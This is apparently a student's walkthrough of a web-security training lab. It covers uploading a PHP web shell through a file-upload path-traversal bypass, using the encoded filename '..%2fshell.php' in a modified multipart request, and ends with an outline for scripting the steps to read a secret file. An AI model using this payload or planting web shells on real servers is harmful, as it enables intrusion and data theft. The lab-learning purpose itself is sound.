### Lab: Web shell upload via path traversal

This lab contains a vulnerable image upload function.
The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret.
Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

_____

Regular workflow
1) Access as wiener:peter
2) Use Upload button to upload *.php file
3) Navigate to /files/avatars/*-php file => server return content of php file but does not execute it


Exploit
1) Access as wiener:peter
2) Use Burp Repeater to send a POST request modified
`Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
Content-Type: application/octet-stream`

In this case the payload (..%2fshell.php) works because the server does not check encoded characters to strip.
Setting the value of _filename_ as "../" does NOT work because the server strips blacklisted strings and characters.

3) Browsing to [website]/files/shell.php force the server to execute the script and display the content of the file /home/carlos/secret


______

SCRIPT STRUCTURE

1) GET /login
    1a) Store session cookie
    1a) Store csrf token
2) POST /login
    2a) Store authenticated session cookie
3) GET /my-account
    3a) Store csrf token
4) POST /my-account/avatar
    4a) In multipart section with information about file upload set filename=..%2fshell.php
5) GET /files/shell.php
    5a) Fetch content